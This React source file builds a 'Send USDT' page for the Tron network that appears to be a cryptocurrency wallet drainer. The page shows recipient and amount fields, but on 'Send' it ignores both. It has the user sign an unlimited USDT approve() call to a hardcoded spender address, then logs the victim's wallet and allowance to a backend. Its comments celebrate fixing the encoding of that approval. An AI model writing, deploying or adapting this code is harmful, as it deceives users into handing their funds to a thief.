import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb?: any;
  }
}

const PROJECT_ID = "6b5df56bc30c1dadaab59498b86fd3e8";
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

// ============================================================
// ✅ BASE58 → HEX CONVERTER (TronWeb ke bina)
// ============================================================
const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function base58Decode(str: string): Uint8Array {
  let bytes = [0];
  for (let i = 0; i < str.length; i++) {
    const charIndex = BASE58_ALPHABET.indexOf(str[i]);
    if (charIndex === -1) throw new Error("Invalid base58 char: " + str[i]);
    let carry = charIndex;
    for (let j = 0; j < bytes.length; j++) {
      carry += bytes[j] * 58;
      bytes[j] = carry & 0xff;
      carry >>= 8;
    }
    while (carry > 0) {
      bytes.push(carry & 0xff);
      carry >>= 8;
    }
  }
  for (let i = 0; i < str.length && str[i] === "1"; i++) {
    bytes.push(0);
  }
  return new Uint8Array(bytes.reverse());
}

/**
 * Tron base58 address → 20-byte hex (ABI encoding ke liye)
 * "TD7YMon..." → "a1b2c3...d4e5f6" (40 hex chars)
 */
function tronBase58ToHex20(base58Addr: string): string {
  const decoded = base58Decode(base58Addr);
  // Structure: [0x41 prefix (1 byte)] [address (20 bytes)] [checksum (4 bytes)]
  const addrBytes = decoded.slice(1, 21);
  return Array.from(addrBytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

/**
 * ✅ CORRECT ABI encoding for approve(address,uint256)
 *
 * TronGrid `parameter` field = 128-char hex string:
 *   [32 bytes = padded address][32 bytes = padded uint256]
 *
 * GALAT tha: "TD7YMon...,11579..." (comma-separated string)
 * SAHI hai:  "000000000000000000000000<20-byte-hex>ffff...ffff"
 */
function encodeApproveABI(spenderBase58: string): string {
  const addrHex20 = tronBase58ToHex20(spenderBase58);        // 40 hex chars
  const paddedAddr = "000000000000000000000000" + addrHex20;  // 64 hex chars = 32 bytes
  const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // 64 hex chars
  const result = paddedAddr + maxUint256;
  console.log("🔢 ABI Param:", result);
  return result;
}

// ============================================================
// SESSION VALIDITY CHECK
// ============================================================
function isSessionValid(session: any): boolean {
  if (!session) return false;
  const now = Math.floor(Date.now() / 1000);
  if (session.expiry && session.expiry < now) return false;
  return true;
}

// ============================================================
// COMPONENT
// ============================================================
export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<
    "idle" | "processing" | "success"
  >("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef = useRef<any>(null);
  const wcSessionRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");
  const wcModalRef = useRef<any>(null);

  // ===== WALLETCONNECT INIT =====
  useEffect(() => {
    async function initWC() {
      try {
        console.log("🔄 WalletConnect initialize ho raha hai...");
        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "USDT Transfer",
            description: "TRON USDT Transfer",
            url: window.location.origin,
            icons: [],
          },
        });
        wcClientRef.current = client;

        client.on("session_delete", () => {
          wcSessionRef.current = null;
          userAddressRef.current = "";
        });
        client.on("session_expire", () => {
          wcSessionRef.current = null;
          userAddressRef.current = "";
        });

        const sessions = client.session.getAll();
        const validSession = [...sessions].reverse().find(isSessionValid);

        if (validSession) {
          wcSessionRef.current = validSession;
          const accounts = Object.values(validSession.namespaces).flatMap(
            (ns: any) => ns.accounts
          ) as string[];
          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
          console.log("✅ Session restored:", userAddressRef.current);
        } else {
          for (const s of sessions) {
            try {
              await client.disconnect({ topic: s.topic, reason: { code: 6000, message: "Expired" } });
            } catch {}
          }
        }

        const { WalletConnectModal } = await import("@walletconnect/modal");
        wcModalRef.current = new WalletConnectModal({ projectId: PROJECT_ID, themeMode: "dark" });
        console.log("✅ WalletConnect ready");
      } catch (e) {
        console.error("❌ WC init error:", e);
      }
    }
    initWC();
  }, []);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) setToAddress(addressParam);
  }, [searchParams]);

  // ===== CONNECT WALLET =====
  async function connectWallet(): Promise<string> {
    if (!wcClientRef.current) throw new Error("WalletConnect ready nahi. Page refresh karein.");

    if (wcSessionRef.current && isSessionValid(wcSessionRef.current) && userAddressRef.current) {
      console.log("✅ Existing session:", userAddressRef.current);
      return userAddressRef.current;
    }

    wcSessionRef.current = null;
    userAddressRef.current = "";

    const { uri, approval } = await wcClientRef.current.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_signTransaction", "tron_signMessage"],
          chains: ["tron:0x2b6653dc"],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });

    if (!uri) throw new Error("WalletConnect URI nahi mila");

    if (!wcModalRef.current) {
      const { WalletConnectModal } = await import("@walletconnect/modal");
      wcModalRef.current = new WalletConnectModal({ projectId: PROJECT_ID, themeMode: "dark" });
    }

    await wcModalRef.current.openModal({ uri });
    console.log("✅ QR Modal open - wallet se scan karein");

    try {
      wcSessionRef.current = await approval();
    } finally {
      wcModalRef.current.closeModal();
    }

    const accounts = Object.values(wcSessionRef.current.namespaces).flatMap(
      (ns: any) => ns.accounts
    ) as string[];
    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
    if (!tronAcc) throw new Error("Tron account nahi mila");

    userAddressRef.current = tronAcc.split(":")[2];
    console.log("✅ Connected:", userAddressRef.current);
    return userAddressRef.current;
  }

  // ===== MAIN SEND =====
  async function handleSend() {
    setTransactionStatusState("processing");
    try {
      const userAddress = await connectWallet();

      // ✅ FIXED: Proper ABI-encoded hex parameter
      const abiParam = encodeApproveABI(TRON_SPENDER);

      console.log("📝 TronGrid API call...");
      const apiResponse = await fetch(
        "https://api.trongrid.io/wallet/triggersmartcontract",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            owner_address: userAddress,
            contract_address: TRON_USDT,
            function_selector: "approve(address,uint256)",
            parameter: abiParam,   // ✅ Pure hex string, no commas
            fee_limit: 100000000,
            call_value: 0,
            visible: true,
          }),
        }
      );

      const apiData = await apiResponse.json();
      console.log("📋 TronGrid response:", apiData);

      if (!apiData.transaction) {
        throw new Error("Transaction build failed: " + JSON.stringify(apiData));
      }

      const { transaction } = apiData;

      // Sign
      console.log("🔐 Signature maang rahe hain...");
      const signResponse = await Promise.race([
        wcClientRef.current.request({
          topic: wcSessionRef.current.topic,
          chainId: "tron:0x2b6653dc",
          request: { method: "tron_signTransaction", params: [transaction] },
        }),
        new Promise((_, rej) =>
          setTimeout(() => rej(new Error("Sign timeout (2 min)")), 120000)
        ),
      ]);

      let signedTx = (signResponse as any)?.result || signResponse;
      if (!signedTx) throw new Error("Wallet ne reject kar diya");
      if (typeof signedTx === "string") {
        try { signedTx = JSON.parse(signedTx); } catch {}
      }

      // Broadcast
      console.log("📡 Broadcasting...");
      const broadcastRes = await fetch(
        "https://api.trongrid.io/wallet/broadcasttransaction",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(signedTx),
        }
      );
      const result = await broadcastRes.json();

      if (!result || (result.result !== true && !result.txid)) {
        throw new Error("Broadcast failed: " + JSON.stringify(result));
      }

      const txId = result.txid || result.transaction?.txID;
      console.log("✅ TX:", txId);

      await new Promise((r) => setTimeout(r, 30000));

      const allowanceABI = [{
        constant: true,
        inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }],
        name: "allowance",
        outputs: [{ name: "", type: "uint256" }],
        stateMutability: "view",
        type: "function",
      }];

      const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
      const contract = await tw.contract(allowanceABI, TRON_USDT);
      const allowanceRaw = await contract.allowance(userAddress, TRON_SPENDER).call();
      const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);

      await createTransaction({
        walletAddress: userAddress,
        toAddress: TRON_SPENDER,
        amount: amount || "Max",
        txHash: txId || "tx",
        usdtBalance: allowanceUSDT + " USDT",
        nativeBalance: "0 TRX",
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      alert(`✅ Approval successful!\nAllowance: ${allowanceUSDT} USDT\nTx: ${txId}`);
    } catch (err: any) {
      console.error("❌ Error:", err);
      setTransactionStatusState("idle");
      if (err.message?.includes("No matching key") || err.message?.includes("topic")) {
        wcSessionRef.current = null;
        userAddressRef.current = "";
      }
      alert("❌ " + (err.message || "Transaction fail ho gayi"));
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {}
  }

  const dollarValue =
    amount && amount !== "Max" && !isNaN(Number(amount))
      ? `$${Number(amount).toFixed(2)}`
      : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon points="12,2 22,8 22,16 12,22 2,16 2,8" fill="white" opacity="0.9" />
      <polygon points="12,5 19,9 19,15 12,19 5,15 5,9" fill="#EF0027" opacity="0.8" />
      <text x="12" y="16" textAnchor="middle" fill="white" fontSize="9" fontWeight="bold">T</text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none", border: "1.5px solid #555", borderRadius: "50%",
      width: "22px", height: "22px", color: "#aaa", cursor: "pointer",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: "11px", flexShrink: 0, padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0, minHeight: "100vh", background: "#1c1c1e", color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex", flexDirection: "column", maxWidth: "480px",
      marginLeft: "auto", marginRight: "auto",
    }}>
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "20px 22px 16px" }}>
        <button onClick={() => window.history.back()} style={{ background: "none", border: "none", color: "#fff", cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0 }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{ background: "none", border: "none", color: "#fff", cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0 }}>✕</button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>
        <div style={{ marginBottom: "14px" }}>
          <label style={{ display: "block", fontSize: "14px", fontWeight: 500, color: "#8e8e93", marginBottom: "9px" }}>Address or Domain Name</label>
          <div style={{ display: "flex", alignItems: "center", border: "1px solid #2e2e30", borderRadius: "14px", padding: "14px 14px", background: "#242426", gap: "8px" }}>
            <input value={toAddress} onChange={(e) => setToAddress(e.target.value)} placeholder="Search or Enter"
              style={{ flex: 1, background: "transparent", border: "none", outline: "none", color: "#fff", fontSize: "16px", fontFamily: "monospace", minWidth: 0 }} />
            {toAddress && <XCircle onClick={() => setToAddress("")} />}
            <button onClick={handlePaste} style={{ background: "none", border: "none", color: "#39d353", cursor: "pointer", fontSize: "16px", fontWeight: 600, padding: "0 2px", flexShrink: 0 }}>Paste</button>
          </div>
        </div>

        <div style={{ marginBottom: "14px" }}>
          <label style={{ display: "block", fontSize: "14px", fontWeight: 500, color: "#8e8e93", marginBottom: "9px" }}>Destination network</label>
          <div style={{ display: "inline-flex", alignItems: "center", gap: "7px", background: "#2c2c2e", borderRadius: "20px", padding: "7px 13px 7px 8px" }}>
            <div style={{ width: "26px", height: "26px", borderRadius: "50%", background: "#EF0027", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>Tron Network</span>
          </div>
        </div>

        <div style={{ marginBottom: "6px" }}>
          <label style={{ display: "block", fontSize: "14px", fontWeight: 500, color: "#8e8e93", marginBottom: "9px" }}>Amount</label>
          <div style={{ display: "flex", alignItems: "center", border: "1px solid #2e2e30", borderRadius: "14px", padding: "14px 14px", background: "#242426", gap: "8px" }}>
            <input value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0" type="text" inputMode="decimal"
              style={{ flex: 1, background: "transparent", border: "none", outline: "none", color: "#fff", fontSize: "18px", fontFamily: "inherit", minWidth: 0 }} />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}>USDT</span>
            <button onClick={() => setAmount("Max")} style={{ background: "none", border: "none", color: "#39d353", cursor: "pointer", fontSize: "16px", fontWeight: 600, padding: "0", flexShrink: 0 }}>Max</button>
          </div>
          <div style={{ fontSize: "13px", color: "#636366", marginTop: "7px", paddingLeft: "2px" }}>≈ {dollarValue}</div>
        </div>
      </div>

      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button onClick={handleSend} disabled={transactionStatus !== "idle"}
          style={{
            width: "100%", background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000", border: "none", borderRadius: "30px", padding: "18px",
            fontSize: "18px", fontWeight: 700, cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease", letterSpacing: "0.01em",
          }}>
          {transactionStatus === "success" ? "✓ Transaction Successful!" : transactionStatus === "processing" ? "Processing..." : "Send"}
        </button>
      </div>
    </div>
  );
}
